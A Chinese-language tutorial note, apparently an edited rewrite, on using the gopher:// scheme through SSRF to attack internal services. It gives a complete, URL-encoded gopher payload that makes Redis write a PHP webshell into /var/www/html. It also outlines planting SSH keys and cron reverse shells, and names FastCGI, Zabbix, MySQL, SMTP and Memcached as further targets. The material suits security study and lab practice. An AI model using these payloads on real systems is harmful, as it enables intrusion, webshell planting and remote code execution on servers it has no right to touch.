# gopher 协议：SSRF 利用里的万能钥匙

## 它到底强在哪

大部分 HTTP 库只认 http:// 和 file://，想让它们给别的服务发请求基本没戏。gopher 的特别之处在于，它允许你把一段原始的 TCP 数据直接塞进 URL 里——服务器解析这个 URL 时，会把下划线后面的所有字节原封不动地发往目标端口。

这就很有意思了。正常情况下你没法通过 HTTP 请求去操作 Redis，但只要目标机器存在 SSRF，你就能借它的手，让它本地的 socket 替你连 127.0.0.1:6379 并把数据发过去。相当于 SSRF 从“只能摸 HTTP”升级成了“能打任意 TCP 服务”，这就是 gopher 被叫作 SSRF 神器的原因。

## URL 的格式和编码

结构很简单：

```
gopher://<host>:<port>/_<TCP数据>
```

下划线本身没什么含义，就是个占位符，关键是它后面的内容会全部被当作 TCP 负载原样发送。

有个必须注意的坑：这段数据必须做 URL 编码。换行 \r\n 要写成 %0D%0A，空格写成 %20。手写的时候漏掉一个换行，整段命令就乱了，对端会直接报协议错误。

## 实战：打 Redis

最经典的场景就是用 SSRF + gopher 控制目标内网的 Redis，往网站目录写一个 WebShell。

先写好要在 redis-cli 里执行的命令：

```
set attack "<?php phpinfo(); ?>"
config set dir /var/www/html
config set dbfilename shell.php
save
```

Redis 实际收到的是 RESP 格式的字节流，每条命令外面都包着 *N（参数个数）和 $长度。转成原始数据就是：

```
*3\r\n$3\r\nset\r\n$6\r\nattack\r\n$19\r\n<?php phpinfo(); ?>\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n
*4\r\n$6\r\nconfig\r\n$3\r\nset\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n
*3\r\n$4\r\nsave\r\n
```

这里注意一下，`<?php phpinfo(); ?>` 实际是 19 个字节，所以是 $19——网上不少笔记写的 $23 是错的，长度对不上的话 Redis 解析会串位，后面的命令全部作废。

然后整段 URL 编码（\r\n 全部换成 %0D%0A），拼上 gopher 头：

```
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$6%0D%0Aattack%0D%0A$19%0D%0A%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*3%0D%0A$4%0D%0Asave%0D%0Aquit%0D%0A
```

末尾多加一个 quit 是个小技巧，保证 Redis 把前面的命令完整执行完再断开。SSRF 服务端请求这个 URL 之后，/var/www/html 下就会多出一个 shell.php。

实际动手的时候最容易翻车的就是编码这一步：\r\n 忘了转、长度字段算错、或者 URL 中间还隔了一层跳转没做二次编码，都会出现“明明构造对了却不生效”的情况。

除了写 WebShell，Redis 这条路还能写 SSH 公钥（往 ~/.ssh/authorized_keys 里塞）和写计划任务反弹 shell，思路完全一样，只是换个落盘位置。

## 其他能打的服务

同一个套路，换个协议包就能打别的内网服务：

|服务|端口|能干什么|备注|
|---|---|---|---|
|MySQL|3306|读文件、尝试提权|客户端有握手认证包，裸构造很麻烦，一般用 Gopherus 这类工具生成|
|FastCGI|9000|直接执行任意 PHP 代码|配合 PHP_VALUE 改配置，连 WebShell 都不用落盘|
|SMTP|25|伪造内部邮件|构造 HELO / MAIL FROM / RCPT TO / DATA|
|Zabbix|10050|system.run 执行命令|JSON 格式的请求包|
|Memcached|11211|存数据、缓存投毒|文本协议，构造和 Redis 类似|

个人感觉这里面 FastCGI 是仅次于 Redis 的第二优先目标，9000 端口一旦通，基本等于直接拿到代码执行。MySQL 就麻烦多了，得先完成认证握手，纯手搓不现实，都是拿工具生成 payload。

拿靶机把 Redis 这条链路完整跑一遍，gopher 的构造基本就掌握了。

---

主要改动：原文 `$23` 是个长度错误（改成了 `$19`，并在文中说明），末尾补了个 `quit` 保证命令执行完整；结构和语气上从“教程腔”改成了自己的笔记口吻，去掉了编号步骤和“⚠️ 非常重要”这类排版。